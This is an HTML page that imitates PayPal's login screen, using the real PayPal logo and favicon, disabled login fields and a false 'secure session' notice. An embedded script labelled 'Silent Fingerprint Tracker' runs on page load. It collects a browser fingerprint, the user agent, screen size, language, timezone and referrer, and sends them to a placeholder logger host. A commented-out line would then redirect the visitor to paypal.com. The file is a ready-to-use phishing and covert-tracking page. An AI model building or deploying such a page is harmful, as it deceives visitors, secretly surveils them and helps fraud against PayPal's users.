<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>PayPal: Log In</title>
  <link rel="icon" href="https://www.paypalobjects.com/webstatic/icon/favicon.ico" />
  <style>
    body {
      background: #fff;
      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
      margin: 0;
      padding: 0;
    }
    .container {
      max-width: 400px;
      margin: 100px auto;
      border: 1px solid #e0e0e0;
      border-radius: 8px;
      padding: 30px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    .paypal-logo {
      text-align: center;
      margin-bottom: 20px;
    }
    .paypal-logo img {
      width: 100px;
    }
    h2 {
      text-align: center;
      font-weight: normal;
      margin-bottom: 30px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 16px;
      box-sizing: border-box;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #0070ba;
      color: white;
      font-size: 16px;
      font-weight: bold;
      border: none;
      border-radius: 5px;
      cursor: not-allowed;
    }
    .disabled-note {
      font-size: 12px;
      color: #888;
      text-align: center;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="paypal-logo">
      <img src="https://www.paypalobjects.com/images/shared/paypal-logo-129x32.svg" alt="PayPal">
    </div>
    <h2>Log in to your PayPal account</h2>
    <input type="email" placeholder="Email address" disabled />
    <input type="password" placeholder="Password" disabled />
    <button disabled>Log In</button>
    <div class="disabled-note">*This is a secure session</div>
  </div>

  <!-- ðŸ”’ Silent Fingerprint Tracker -->
  <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
  <script>
    ;(async () => {
      const fp = await FingerprintJS.load();
      const result = await fp.get();

      const payload = {
        fingerprint: result.visitorId,
        ip: '',
        userAgent: navigator.userAgent,
        screen: `${screen.width}x${screen.height}`,
        lang: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer,
        timestamp: new Date().toISOString()
      };

      fetch('https://yourdomain.com/logger.php', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(payload)
      });

      // Optional: redirect after few seconds
      // setTimeout(() => window.location.href = 'https://paypal.com', 7000);
    })();
  </script>
</body>
</html>
